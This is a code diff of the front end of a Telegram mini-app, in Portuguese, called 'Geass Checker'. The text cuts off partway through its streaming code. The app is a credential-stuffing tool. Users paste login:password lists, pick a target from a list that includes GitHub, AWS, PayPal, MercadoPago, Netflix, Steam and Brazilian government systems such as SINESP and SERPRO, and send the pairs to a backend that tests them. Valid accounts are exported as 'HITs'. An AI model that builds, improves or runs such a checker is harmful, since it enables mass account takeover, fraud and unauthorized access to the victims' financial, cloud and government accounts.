@@ -2,285 +2,538 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
-<title>Geass Command Center</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
+<title>Geass Checker</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
-  :root {
-    --bg:      #050008;
-    --bg2:     #0d0018;
-    --red:     #cc1a1a;
-    --red2:    #ff2020;
-    --gold:    #c9a227;
-    --gold2:   #f0cc50;
-    --purple:  #4a0080;
-    --text:    #f0e6ff;
-    --text2:   #a08ab8;
-    --border:  #2a0050;
-    --mono:    'Courier New', monospace;
-  }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  html, body { height: 100%; background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; overflow-x: hidden; }
+/* ── Variables ───────────────────────────────────────────── */
+:root {
+  --bg:       #050008;
+  --bg2:      #0d0015;
+  --bg3:      #160020;
+  --red:      #cc1a1a;
+  --red2:     #ff3030;
+  --gold:     #c9a227;
+  --gold2:    #f0cc50;
+  --green:    #22dd77;
+  --amber:    #f59e0b;
+  --text:     #f0e6ff;
+  --text2:    #9a82b5;
+  --border:   #240040;
+  --radius:   10px;
+  --mono:     'Courier New', monospace;
+}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;overflow-x:hidden}
 
-  /* ─── Animated background ─────────────── */
-  body::before {
-    content: '';
-    position: fixed; inset: 0; z-index: 0;
-    background: radial-gradient(ellipse at 50% 0%, rgba(76,0,128,.4) 0%, transparent 60%),
-                radial-gradient(ellipse at 80% 100%, rgba(180,0,0,.2) 0%, transparent 50%);
-    pointer-events: none;
-  }
+/* ── Bg glow ─────────────────────────────────────────────── */
+body::before{content:'';position:fixed;inset:0;z-index:0;
+  background:radial-gradient(ellipse at 50% -10%,rgba(80,0,140,.45) 0%,transparent 55%),
+             radial-gradient(ellipse at 90% 90%,rgba(160,0,0,.18) 0%,transparent 45%);
+  pointer-events:none}
 
-  /* ─── Geass symbol (rotating) ─────────────── */
-  .geass-bg {
-    position: fixed;
-    top: 50%; left: 50%;
-    transform: translate(-50%, -50%);
-    width: min(90vw, 500px); height: min(90vw, 500px);
-    opacity: .06;
-    animation: spin 40s linear infinite;
-    pointer-events: none;
-    z-index: 0;
-  }
-  @keyframes spin { to { transform: translate(-50%,-50%) rotate(360deg); } }
+/* ── Layout ──────────────────────────────────────────────── */
+.app{position:relative;z-index:1;display:flex;flex-direction:column;min-height:100vh}
 
-  /* ─── Layout ─────────────── */
-  .app { position: relative; z-index: 1; min-height: 100vh; display: flex; flex-direction: column; }
+/* ── Hero (compact) ──────────────────────────────────────── */
+.hero{position:relative;height:140px;overflow:hidden;border-bottom:1px solid var(--border)}
+.hero-img{position:absolute;top:0;left:50%;transform:translateX(-50%);height:100%;width:auto;min-width:100%;object-fit:cover;object-position:center 8%;filter:saturate(1.2)}
+.hero-overlay{position:absolute;inset:0;background:linear-gradient(to bottom,rgba(5,0,8,.25) 30%,rgba(5,0,8,1) 100%)}
+.hero-inner{position:relative;z-index:2;display:flex;flex-direction:column;align-items:center;justify-content:flex-end;height:100%;padding-bottom:12px}
+.hero-title{font-size:1.15rem;font-weight:900;letter-spacing:.1em;color:var(--gold2);text-shadow:0 0 20px rgba(201,162,39,.7);text-transform:uppercase}
+.hero-sub{font-size:.6rem;color:var(--text2);letter-spacing:.18em;margin-top:2px}
+.eye-badge{position:absolute;top:10px;right:10px;z-index:3;width:44px;height:44px;border-radius:50%;overflow:hidden;border:2px solid var(--red);box-shadow:0 0 14px rgba(200,0,0,.6)}
+.eye-badge img{width:100%;height:100%;object-fit:cover}
 
-  /* ─── Hero ─────────────── */
-  .hero {
-    position: relative;
-    display: flex; align-items: flex-end; justify-content: center;
-    height: 260px;
-    overflow: hidden;
-    border-bottom: 1px solid var(--border);
-  }
-  .hero-img {
-    position: absolute; top: 0; left: 50%; transform: translateX(-50%);
-    height: 100%; width: auto; max-width: 120%;
-    object-fit: cover; object-position: center top;
-    filter: saturate(1.3) contrast(1.1);
-  }
-  .hero-overlay {
-    position: absolute; inset: 0;
-    background: linear-gradient(to bottom, rgba(5,0,8,.1) 40%, rgba(5,0,8,1) 100%);
-  }
-  .hero-title {
-    position: relative; z-index: 2;
-    text-align: center; padding-bottom: 20px;
-  }
-  .hero-title h1 {
-    font-size: 1.4rem; font-weight: 900; letter-spacing: .1em;
-    color: var(--gold2);
-    text-shadow: 0 0 20px rgba(201,162,39,.6), 0 0 40px rgba(201,162,39,.3);
-    text-transform: uppercase;
-  }
-  .hero-title p {
-    font-size: .7rem; color: var(--text2); letter-spacing: .2em; margin-top: 4px;
-  }
+/* ── Tab bar ─────────────────────────────────────────────── */
+.tabbar{display:flex;background:var(--bg2);border-bottom:1px solid var(--border)}
+.tab-btn{flex:1;padding:11px 4px;font-size:.7rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--text2);background:none;border:none;cursor:pointer;border-bottom:2px solid transparent;transition:color .15s,border-color .15s}
+.tab-btn.active{color:var(--gold2);border-bottom-color:var(--gold)}
 
-  /* ─── Eye badge ─────────────── */
-  .eye-badge {
-    position: absolute; top: 12px; right: 12px; z-index: 3;
-    width: 52px; height: 52px; border-radius: 50%;
-    overflow: hidden; border: 2px solid var(--red);
-    box-shadow: 0 0 16px rgba(200,0,0,.6);
-  }
-  .eye-badge img { width: 100%; height: 100%; object-fit: cover; }
+/* ── Panels ──────────────────────────────────────────────── */
+.panel{display:none;flex:1;overflow-y:auto;padding:14px 12px 80px}
+.panel.show{display:block}
 
-  /* ─── Content ─────────────── */
-  .content { flex: 1; padding: 20px 16px 32px; }
+/* ── Section label ───────────────────────────────────────── */
+.sec-label{font-size:.58rem;letter-spacing:.18em;text-transform:uppercase;color:var(--red);margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.sec-label::after{content:'';flex:1;height:1px;background:linear-gradient(to right,var(--border),transparent)}
 
-  /* ─── Divider ─────────────── */
-  .divider {
-    display: flex; align-items: center; gap: 8px;
-    margin: 16px 0 12px;
-    font-size: .65rem; letter-spacing: .18em; color: var(--red); text-transform: uppercase;
-  }
-  .divider::before, .divider::after {
-    content: ''; flex: 1; height: 1px;
-    background: linear-gradient(to right, transparent, var(--red), transparent);
-  }
+/* ── Target grid ─────────────────────────────────────────── */
+.target-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;margin-bottom:10px}
+.target-card{display:flex;flex-direction:column;align-items:center;gap:4px;padding:10px 4px;border-radius:var(--radius);background:var(--bg2);border:1px solid var(--border);cursor:pointer;transition:border-color .15s,background .15s}
+.target-card.selected{border-color:var(--gold);background:rgba(201,162,39,.1)}
+.target-card .tc-emoji{font-size:1.3rem}
+.target-card .tc-name{font-size:.6rem;font-weight:700;text-align:center;color:var(--text)}
+.target-card .tc-note{font-size:.52rem;color:var(--text2);text-align:center}
 
-  /* ─── Stat cards ─────────────── */
-  .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-  .stat-card {
-    background: var(--bg2); border: 1px solid var(--border);
-    border-radius: 10px; padding: 14px 12px;
-    display: flex; flex-direction: column; gap: 4px;
-  }
-  .stat-card.red  { border-color: rgba(204,26,26,.4); }
-  .stat-card.gold { border-color: rgba(201,162,39,.3); grid-column: 1/-1; }
-  .stat-label { font-size: .6rem; color: var(--text2); text-transform: uppercase; letter-spacing: .1em; }
-  .stat-value {
-    font-size: 1.6rem; font-weight: 900; font-family: var(--mono);
-    color: var(--gold2);
-    text-shadow: 0 0 12px rgba(201,162,39,.4);
-  }
-  .stat-card.red  .stat-value { color: var(--red2); text-shadow: 0 0 12px rgba(255,32,32,.4); }
-  .stat-sub { font-size: .65rem; color: var(--text2); }
+/* ── Category filter ─────────────────────────────────────── */
+.cat-scroll{display:flex;gap:6px;overflow-x:auto;padding-bottom:8px;scrollbar-width:none;margin-bottom:10px}
+.cat-scroll::-webkit-scrollbar{display:none}
+.cat-pill{flex-shrink:0;padding:5px 12px;border-radius:20px;font-size:.62rem;font-weight:700;letter-spacing:.05em;background:var(--bg3);border:1px solid var(--border);color:var(--text2);cursor:pointer;transition:background .15s,border-color .15s,color .15s}
+.cat-pill.active{background:rgba(201,162,39,.15);border-color:var(--gold);color:var(--gold2)}
 
-  /* ─── Quote ─────────────── */
-  .quote {
-    margin-top: 20px;
-    padding: 14px 16px; border-left: 3px solid var(--red);
-    background: rgba(204,26,26,.07); border-radius: 0 8px 8px 0;
-    font-style: italic; font-size: .8rem; color: var(--text2);
-    line-height: 1.5;
-  }
-  .quote strong { color: var(--gold); font-style: normal; display: block; margin-top: 6px; font-size: .7rem; }
+/* ── Checker panel ───────────────────────────────────────── */
+.selected-target-badge{display:flex;align-items:center;gap:8px;padding:10px 12px;border-radius:var(--radius);background:rgba(201,162,39,.08);border:1px solid rgba(201,162,39,.25);margin-bottom:12px}
+.stb-emoji{font-size:1.4rem}
+.stb-info{display:flex;flex-direction:column}
+.stb-name{font-size:.8rem;font-weight:700;color:var(--gold2)}
+.stb-note{font-size:.62rem;color:var(--text2)}
+.stb-change{font-size:.6rem;color:var(--red2);margin-left:auto;cursor:pointer;text-decoration:underline}
 
-  /* ─── Bottom bar ─────────────── */
-  .bottom-bar {
-    position: sticky; bottom: 0; z-index: 10;
-    background: rgba(5,0,8,.95); border-top: 1px solid var(--border);
-    padding: 12px 16px; display: flex; gap: 8px;
-    backdrop-filter: blur(12px);
-  }
-  .btn {
-    flex: 1; padding: 12px 8px; border: none; border-radius: 10px;
-    font-weight: 700; font-size: .82rem; cursor: pointer;
-    text-transform: uppercase; letter-spacing: .05em; transition: opacity .15s;
-  }
-  .btn:active { opacity: .8; }
-  .btn-primary {
-    background: linear-gradient(135deg, var(--red) 0%, #8a0000 100%);
-    color: #fff;
-    box-shadow: 0 4px 16px rgba(204,0,0,.35);
-  }
-  .btn-ghost {
-    background: var(--bg2); color: var(--text2);
-    border: 1px solid var(--border);
-  }
+.cred-area{width:100%;height:120px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);padding:10px;color:var(--text);font-family:var(--mono);font-size:.72rem;resize:none;outline:none;line-height:1.5}
+.cred-area:focus{border-color:rgba(201,162,39,.4)}
+.cred-area::placeholder{color:var(--text2);opacity:.6}
+.cred-counter{font-size:.62rem;color:var(--text2);margin-top:4px;margin-bottom:12px}
 
-  /* ─── Live indicator ─────────────── */
-  .live-dot {
-    display: inline-block; width: 7px; height: 7px;
-    border-radius: 50%; background: #22ff88;
-    animation: pulse 1.2s ease-in-out infinite;
-    margin-right: 5px; vertical-align: middle;
-  }
-  @keyframes pulse {
-    0%,100% { opacity: 1; transform: scale(1); }
-    50%      { opacity: .4; transform: scale(.7); }
-  }
-  .live-label { font-size: .65rem; color: #22ff88; letter-spacing: .1em; }
+/* ── Buttons ─────────────────────────────────────────────── */
+.btn-row{display:flex;gap:8px;margin-top:12px}
+.btn{flex:1;padding:13px 10px;border:none;border-radius:var(--radius);font-weight:800;font-size:.8rem;letter-spacing:.06em;text-transform:uppercase;cursor:pointer;transition:opacity .15s}
+.btn:active{opacity:.8}
+.btn:disabled{opacity:.35;cursor:not-allowed}
+.btn-primary{background:linear-gradient(135deg,var(--red) 0%,#800000 100%);color:#fff;box-shadow:0 4px 18px rgba(180,0,0,.35)}
+.btn-stop{background:linear-gradient(135deg,#500000 0%,var(--red) 100%);color:#fff;box-shadow:0 4px 18px rgba(180,0,0,.35)}
+.btn-ghost{background:var(--bg3);color:var(--text2);border:1px solid var(--border)}
+
+/* ── Progress ────────────────────────────────────────────── */
+.progress-wrap{margin:12px 0}
+.progress-meta{display:flex;justify-content:space-between;font-size:.7rem;margin-bottom:5px;font-family:var(--mono);color:var(--text2)}
+.progress-meta .pct{color:var(--gold)}
+.progress-bar{height:6px;background:var(--bg3);border-radius:3px;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(to right,var(--red),var(--gold));border-radius:3px;transition:width .4s ease}
+
+/* ── Result cards ────────────────────────────────────────── */
+.result-tabs{display:flex;gap:6px;margin-bottom:10px}
+.result-tab{flex:1;display:flex;align-items:center;justify-content:center;gap:5px;padding:8px 4px;border-radius:var(--radius);background:var(--bg3);border:1px solid var(--border);font-size:.65rem;font-weight:700;cursor:pointer;color:var(--text2);transition:background .15s,border-color .15s,color .15s}
+.result-tab.rt-hit.active{border-color:rgba(34,221,119,.4);color:var(--green);background:rgba(34,221,119,.08)}
+.result-tab.rt-fail.active{border-color:rgba(204,26,26,.4);color:var(--red2);background:rgba(204,26,26,.08)}
+.result-tab.rt-error.active{border-color:rgba(245,158,11,.4);color:var(--amber);background:rgba(245,158,11,.08)}
+.result-tab .rt-count{font-family:var(--mono);font-size:.72rem;font-weight:900}
+
+.result-list{display:flex;flex-direction:column;gap:5px;max-height:300px;overflow-y:auto}
+.result-item{padding:8px 10px;border-radius:8px;font-size:.68rem;font-family:var(--mono);line-height:1.4;word-break:break-all}
+.result-item.ri-hit{background:rgba(34,221,119,.07);border-left:2px solid var(--green);color:var(--text)}
+.result-item.ri-fail{background:rgba(204,26,26,.07);border-left:2px solid var(--red);color:var(--text2)}
+.result-item.ri-error{background:rgba(245,158,11,.07);border-left:2px solid var(--amber);color:var(--text2)}
+.result-item .ri-cred{color:var(--text);font-weight:700}
+.result-item .ri-detail{color:var(--text2);font-size:.62rem}
+.result-empty{text-align:center;color:var(--text2);font-size:.72rem;padding:20px;opacity:.6}
+
+/* ── Stats row ───────────────────────────────────────────── */
+.stats-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:7px;margin-bottom:12px}
+.stat-box{padding:10px 8px;border-radius:var(--radius);background:var(--bg2);border:1px solid var(--border);text-align:center}
+.stat-box .sb-val{font-size:1.2rem;font-weight:900;font-family:var(--mono)}
+.stat-box .sb-lbl{font-size:.55rem;color:var(--text2);text-transform:uppercase;letter-spacing:.08em;margin-top:2px}
+.stat-box.sb-hit .sb-val{color:var(--green)}
+.stat-box.sb-fail .sb-val{color:var(--red2)}
+.stat-box.sb-err .sb-val{color:var(--amber)}
+
+/* ── Live dot ────────────────────────────────────────────── */
+.live-row{display:flex;align-items:center;gap:6px;margin-bottom:8px;font-size:.65rem;color:var(--text2)}
+.live-dot{width:7px;height:7px;border-radius:50%;background:var(--green);animation:pulse 1.2s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.35;transform:scale(.65)}}
+
+/* ── Export btn ──────────────────────────────────────────── */
+.export-btn{display:flex;align-items:center;justify-content:center;gap:6px;padding:10px;border-radius:var(--radius);background:rgba(201,162,39,.1);border:1px solid rgba(201,162,39,.25);color:var(--gold2);font-size:.72rem;font-weight:700;cursor:pointer;margin-top:12px}
+.export-btn:active{opacity:.8}
+
+/* ── Toast ───────────────────────────────────────────────── */
+.toast{position:fixed;bottom:90px;left:50%;transform:translateX(-50%);background:rgba(20,0,35,.95);border:1px solid var(--gold);color:var(--gold2);padding:8px 18px;border-radius:20px;font-size:.72rem;font-weight:700;z-index:100;opacity:0;transition:opacity .3s;pointer-events:none;white-space:nowrap}
+.toast.show{opacity:1}
+
+/* ── Bottom safe area ────────────────────────────────────── */
+.bottom-pad{height:calc(60px + env(safe-area-inset-bottom))}
 </style>
 </head>
 <body>
-<img class="geass-bg" src="geass.jpg" alt=""/>
+<div class="app" id="app">
 
-<div class="app">
   <!-- Hero -->
   <div class="hero">
-    <img class="hero-img" src="lelouch.png" alt="Lelouch"/>
+    <img class="hero-img" src="lelouch.png" alt="" onerror="this.style.display='none'"/>
     <div class="hero-overlay"></div>
-    <div class="hero-title">
-      <h1>👁 Geass Command Center 👁</h1>
-      <p>⚔️ APEX CHECKER · LELOUCH BRITANNIA ⚔️</p>
+    <div class="hero-inner">
+      <div class="hero-title">👁 Geass Checker 👁</div>
+      <div class="hero-sub">⚔️ LELOUCH BRITANNIA · APEX CHECKER ⚔️</div>
     </div>
-    <div class="eye-badge"><img src="lelouch-eyes.jpg" alt="geass eye"/></div>
+    <div class="eye-badge"><img src="lelouch-eyes.jpg" alt="" onerror="this.parentElement.style.display='none'"/></div>
   </div>
 
-  <!-- Content -->
-  <div class="content">
-    <div class="divider">✦ STATUS DO CHECKER ✦</div>
+  <!-- Tab bar -->
+  <div class="tabbar">
+    <button class="tab-btn active" data-tab="targets" onclick="switchTab('targets')">🎯 Alvos</button>
+    <button class="tab-btn" data-tab="checker" onclick="switchTab('checker')">⚔️ Checar</button>
+    <button class="tab-btn" data-tab="results" onclick="switchTab('results')">📊 Resultados</button>
+  </div>
 
-    <div class="stat-grid" id="stats">
-      <div class="stat-card red">
-        <div class="stat-label">✅ HITs</div>
-        <div class="stat-value" id="v-hits">—</div>
-        <div class="stat-sub">credenciais válidas</div>
-      </div>
-      <div class="stat-card red">
-        <div class="stat-label">❌ FAILs</div>
-        <div class="stat-value" id="v-fails">—</div>
-        <div class="stat-sub">senha incorreta</div>
-      </div>
-      <div class="stat-card">
-        <div class="stat-label">⚠️ Erros</div>
-        <div class="stat-value" id="v-errors">—</div>
-        <div class="stat-sub">2FA / timeout / etc</div>
-      </div>
-      <div class="stat-card">
-        <div class="stat-label">⚡ Progresso</div>
-        <div class="stat-value" id="v-pct">—</div>
-        <div class="stat-sub" id="v-done">aguardando...</div>
-      </div>
-      <div class="stat-card gold">
-        <div style="display:flex;align-items:center;justify-content:space-between;">
-          <div>
-            <div class="stat-label">🎯 Alvo Atual</div>
-            <div class="stat-value" style="font-size:1.1rem" id="v-target">—</div>
-          </div>
-          <div style="text-align:right">
-            <span class="live-dot" id="live-dot" style="display:none"></span>
-            <span class="live-label" id="live-label">IDLE</span>
-          </div>
+  <!-- ═══ TARGETS PANEL ═══ -->
+  <div class="panel show" id="panel-targets">
+    <div class="sec-label" style="margin-top:4px">Filtrar categoria</div>
+    <div class="cat-scroll" id="cat-scroll"></div>
+    <div class="sec-label">Selecione o alvo</div>
+    <div class="target-grid" id="target-grid"></div>
+    <div class="btn-row">
+      <button class="btn btn-primary" onclick="goToChecker()" id="btn-go-checker">⚔️ Continuar</button>
+    </div>
+  </div>
+
+  <!-- ═══ CHECKER PANEL ═══ -->
+  <div class="panel" id="panel-checker">
+    <div class="sec-label" style="margin-top:4px">Alvo selecionado</div>
+    <div class="selected-target-badge" id="stb">
+      <span class="stb-emoji" id="stb-emoji">—</span>
+      <span class="stb-info">
+        <span class="stb-name" id="stb-name">Nenhum selecionado</span>
+        <span class="stb-note" id="stb-note">Escolha um alvo primeiro</span>
+      </span>
+      <span class="stb-change" onclick="switchTab('targets')">trocar</span>
+    </div>
+
+    <div class="sec-label">Credenciais</div>
+    <textarea class="cred-area" id="cred-area"
+      placeholder="usuario@email.com:senha123&#10;outro_user:outra_senha&#10;&#10;Um par por linha (login:senha)"
+      oninput="countCreds()"
+    ></textarea>
+    <div class="cred-counter" id="cred-counter">0 credenciais</div>
+
+    <div id="progress-section" style="display:none">
+      <div class="live-row"><span class="live-dot"></span><span id="live-label">Checando...</span></div>
+      <div class="progress-wrap">
+        <div class="progress-meta">
+          <span id="prog-text">0 / 0 verificados</span>
+          <span class="pct" id="prog-pct">0%</span>
         </div>
+        <div class="progress-bar"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div>
       </div>
     </div>
 
-    <div class="divider">✦ PODER DO GEASS ✦</div>
-    <div class="quote">
-      "Eu ordeno — você me obedecerá. Ninguém pode negar o poder do Geass."
-      <strong>— Lelouch vi Britannia</strong>
+    <div class="btn-row" id="action-btns">
+      <button class="btn btn-primary" id="btn-start" onclick="startChecker()">⚔️ Iniciar Checker</button>
     </div>
   </div>
 
-  <!-- Bottom bar -->
-  <div class="bottom-bar">
-    <button class="btn btn-primary" onclick="openPanel()">⚔️ Abrir Painel</button>
-    <button class="btn btn-ghost" onclick="closeApp()">✕ Fechar</button>
+  <!-- ═══ RESULTS PANEL ═══ -->
+  <div class="panel" id="panel-results">
+    <div class="stats-row">
+      <div class="stat-box sb-hit"><div class="sb-val" id="r-hits">0</div><div class="sb-lbl">✅ HITs</div></div>
+      <div class="stat-box sb-fail"><div class="sb-val" id="r-fails">0</div><div class="sb-lbl">❌ FAILs</div></div>
+      <div class="stat-box sb-err"><div class="sb-val" id="r-errors">0</div><div class="sb-lbl">⚡ Erros</div></div>
+    </div>
+
+    <div class="result-tabs">
+      <div class="result-tab rt-hit active" id="rtab-hit" onclick="switchResultTab('hit')">
+        ✅ HITs <span class="rt-count" id="rtcount-hit">0</span>
+      </div>
+      <div class="result-tab rt-fail" id="rtab-fail" onclick="switchResultTab('fail')">
+        ❌ FAILs <span class="rt-count" id="rtcount-fail">0</span>
+      </div>
+      <div class="result-tab rt-error" id="rtab-error" onclick="switchResultTab('error')">
+        ⚡ Erros <span class="rt-count" id="rtcount-error">0</span>
+      </div>
+    </div>
+    <div class="result-list" id="result-list">
+      <div class="result-empty">Inicie um checker para ver os resultados aqui.</div>
+    </div>
+
+    <div class="export-btn" onclick="exportResults()" id="btn-export" style="display:none">
+      ↓ Exportar HITs (.txt)
+    </div>
   </div>
+
+  <div class="bottom-pad"></div>
 </div>
 
+<div class="toast" id="toast"></div>
+
 <script>
+// ── Telegram WebApp init ───────────────────────────────────────────────────────
 const tg = window.Telegram?.WebApp;
 if (tg) { tg.ready(); tg.expand(); }
 
-// Parse data from Telegram initData or URL params
-const params = new URLSearchParams(window.location.search);
-const jobId   = params.get("job");
-const apiBase = params.get("api") || "";
+// ── API base (same origin — Replit proxy routes /api/* to api-server) ─────────
+const API = "";
 
-function setVal(id, val) { const el = document.getElementById(id); if (el) el.textContent = val; }
+// ── Targets ───────────────────────────────────────────────────────────────────
+const TARGETS = [
+  { id:"github",       emoji:"🐙", name:"GitHub",       note:"user:pass · PAT", cat:"Dev/Cloud"   },
+  { id:"aws",          emoji:"☁️",  name:"AWS IAM",      note:"key:secret",      cat:"Dev/Cloud"   },
+  { id:"vultr",        emoji:"💎", name:"Vultr",        note:"API Key",          cat:"VPS"         },
+  { id:"hetzner",      emoji:"🟠", name:"Hetzner",      note:"API Key",          cat:"VPS"         },
+  { id:"digitalocean", emoji:"🌊", name:"DigitalOcean", note:"API Key",          cat:"VPS"         },
+  { id:"linode",       emoji:"🟢", name:"Linode",       note:"API Key",          cat:"VPS"         },
+  { id:"hostinger",    emoji:"🌐", name:"Hostinger",    note:"email:pass",       cat:"VPS"         },
+  { id:"netflix",      emoji:"🎬", name:"Netflix",      note:"email:pass",       cat:"Streaming"   },
+  { id:"crunchyroll",  emoji:"🍥", name:"Crunchyroll",  note:"email:pass",       cat:"Streaming"   },
+  { id:"hbomax",       emoji:"👑", name:"HBO Max",      note:"email:pass",       cat:"Streaming"   },
+  { id:"disney",       emoji:"🏰", name:"Disney+",      note:"email:pass",       cat:"Streaming"   },
+  { id:"amazon",       emoji:"📦", name:"Amazon",       note:"email:pass",       cat:"Streaming"   },
+  { id:"paramount",    emoji:"⭐", name:"Paramount+",   note:"email:pass",       cat:"Streaming"   },
+  { id:"spotify",      emoji:"🎵", name:"Spotify",      note:"user:pass",        cat:"Streaming"   },
+  { id:"paypal",       emoji:"💰", name:"PayPal",       note:"email:pass",       cat:"Financeiro"  },
+  { id:"mercadopago",  emoji:"💳", name:"MercadoPago",  note:"email:pass",       cat:"Financeiro"  },
+  { id:"roblox",       emoji:"🎮", name:"Roblox",       note:"user:pass",        cat:"Gaming"      },
+  { id:"steam",        emoji:"🔵", name:"Steam",        note:"user:pass",        cat:"Gaming"      },
+  { id:"epicgames",    emoji:"🎯", name:"Epic Games",   note:"email:pass",       cat:"Gaming"      },
+  { id:"playstation",  emoji:"🎮", name:"PlayStation",  note:"email:pass",       cat:"Gaming"      },
+  { id:"riot",         emoji:"⚔️", name:"Riot Games",   note:"user:pass",        cat:"Gaming"      },
+  { id:"instagram",    emoji:"📸", name:"Instagram",    note:"user:pass",        cat:"Social"      },
+  { id:"serasa",       emoji:"📊", name:"Serasa",       note:"CPF:pass",         cat:"Governo BR"  },
+  { id:"iseek",        emoji:"🔍", name:"iSeek",        note:"user:pass",        cat:"Governo BR"  },
+  { id:"serpro",       emoji:"🛡️", name:"SERPRO",       note:"user:pass",        cat:"Governo BR"  },
+  { id:"sinesp",       emoji:"🚔", name:"SINESP",       note:"user:pass",        cat:"Governo BR"  },
+  { id:"cpf",          emoji:"🪪",  name:"CPF/CNPJ",     note:"CPF:nascimento",   cat:"Governo BR"  },
+  { id:"ifood",        emoji:"🛵", name:"iFood",        note:"email:pass",       cat:"Delivery"    },
+];
 
-function openPanel() {
-  const url = window.location.origin + window.location.pathname.replace("miniapp.html", "");
-  if (tg) { tg.openLink(url); }
-  else { window.open(url, "_blank"); }
+const CATS = ["Todos", ...new Set(TARGETS.map(t => t.cat))];
+
+// ── State ─────────────────────────────────────────────────────────────────────
+let selectedTarget = TARGETS[0];
+let activeCat      = "Todos";
+let currentTab     = "targets";
+let currentResultTab = "hit";
+let results = { hit: [], fail: [], error: [] };
+let running = false;
+let jobId   = null;
+let abortCtrl = null;
+let total   = 0;
+let done    = 0;
+
+// ── Build target grid ─────────────────────────────────────────────────────────
+function buildTargets() {
+  const scroll = document.getElementById("cat-scroll");
+  scroll.innerHTML = CATS.map(c =>
+    `<div class="cat-pill ${c === activeCat ? 'active' : ''}" onclick="selectCat('${c}')">${c}</div>`
+  ).join("");
+
+  const grid = document.getElementById("target-grid");
+  const vis = activeCat === "Todos" ? TARGETS : TARGETS.filter(t => t.cat === activeCat);
+  grid.innerHTML = vis.map(t =>
+    `<div class="target-card ${t.id === selectedTarget.id ? 'selected' : ''}" onclick="selectTarget('${t.id}')">
+      <span class="tc-emoji">${t.emoji}</span>
+      <span class="tc-name">${t.name}</span>
+      <span class="tc-note">${t.note}</span>
+    </div>`
+  ).join("");
 }
-function closeApp() { if (tg) { tg.close(); } else { window.close(); } }
 
-async function loadStats() {
-  if (!apiBase && !jobId) return;
+function selectCat(cat) {
+  activeCat = cat;
+  buildTargets();
+}
+
+function selectTarget(id) {
+  selectedTarget = TARGETS.find(t => t.id === id) || TARGETS[0];
+  buildTargets();
+  updateStb();
+}
+
+function updateStb() {
+  document.getElementById("stb-emoji").textContent = selectedTarget.emoji;
+  document.getElementById("stb-name").textContent  = selectedTarget.name;
+  document.getElementById("stb-note").textContent  = selectedTarget.note;
+}
+
+function goToChecker() {
+  switchTab("checker");
+}
+
+// ── Tab switching ─────────────────────────────────────────────────────────────
+function switchTab(tab) {
+  document.querySelectorAll(".tab-btn").forEach(b => b.classList.toggle("active", b.dataset.tab === tab));
+  document.querySelectorAll(".panel").forEach(p => p.classList.remove("show"));
+  document.getElementById(`panel-${tab}`).classList.add("show");
+  currentTab = tab;
+}
+
+// ── Credential counter ────────────────────────────────────────────────────────
+function countCreds() {
+  const lines = parseCreds();
+  const el = document.getElementById("cred-counter");
+  el.textContent = `${lines.length} credencial${lines.length !== 1 ? 'is' : ''} detectada${lines.length !== 1 ? 's' : ''}`;
+}
+
+function parseCreds() {
+  const raw = document.getElementById("cred-area").value;
+  return raw.split(/\r?\n/).map(l => l.trim()).filter(l => l.includes(":") && l.length > 3);
+}
+
+// ── Checker ───────────────────────────────────────────────────────────────────
+async function startChecker() {
+  const creds = parseCreds();
+  if (!creds.length) { toast("⚠️ Nenhuma credencial detectada"); return; }
+
+  results = { hit: [], fail: [], error: [] };
+  done  = 0;
+  total = creds.length;
+  running = true;
+  updateResultCounts();
+
+  document.getElementById("progress-section").style.display = "block";
+  document.getElementById("action-btns").innerHTML =
+    `<button class="btn btn-stop" onclick="stopChecker()">🛑 Parar Geass</button>`;
+  updateProgress(0, total);
+  switchTab("checker");
+
+  let data;
   try {
-    if (jobId && apiBase) {
-      const r = await fetch(`${apiBase}/api/checker/${jobId}/status`).catch(() => null);
-      if (r && r.ok) {
-        const d = await r.json();
-        setVal("v-hits",   d.hits   ?? "—");
-        setVal("v-fails",  d.fails  ?? "—");
-        setVal("v-errors", d.errors ?? "—");
-        const pct = d.total > 0 ? Math.round((d.done / d.total) * 100) + "%" : "—";
-        setVal("v-pct",    pct);
-        setVal("v-done",   d.total ? `${d.done}/${d.total} verificados` : "aguardando...");
-        setVal("v-target", d.target ? d.target.toUpperCase() : "—");
-        const dot   = document.getElementById("live-dot");
-        const label = document.getElementById("live-label");
-        if (d.running) {
-          dot.style.display = "inline-block"; label.textContent = "AO VIVO";
-        } else {
-          dot.style.display = "none"; label.textContent = d.done > 0 ? "CONCLUÍDO" : "IDLE";
+    const r = await fetch(`${API}/api/checker/start`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ target: selectedTarget.id, credentials: creds }),
+    });
+    if (!r.ok) throw new Error(`HTTP ${r.status}`);
+    data = await r.json();
+  } catch(e) {
+    toast(`❌ Erro ao iniciar: ${e.message}`);
+    resetCheckerUI();
+    return;
+  }
+
+  jobId = data.jobId;
+
+  // SSE stream
+  abortCtrl = new AbortController();
+  try {
+    const resp = await fetch(`${API}/api/checker/${jobId}/stream`, { signal: abortCtrl.signal });
+    if (!resp.ok || !resp.body) throw new Error("stream indisponível");
+    const reader  = resp.body.getReader();
+    const decoder = new TextDecoder();
+    let buf = "";
+
+    while(true) {
+      const { done: streamDone, value } = await reader.read();
+      if(streamDone) break;
+      buf += decoder.decode(value, { stream: true });
+      const blocks = buf.split("\n\n");
+      buf = blocks.pop() ?? "";
+      for(const block of blocks) {
+        const line = block.trim();
+        if(!line.startsWith("data:")) continue;
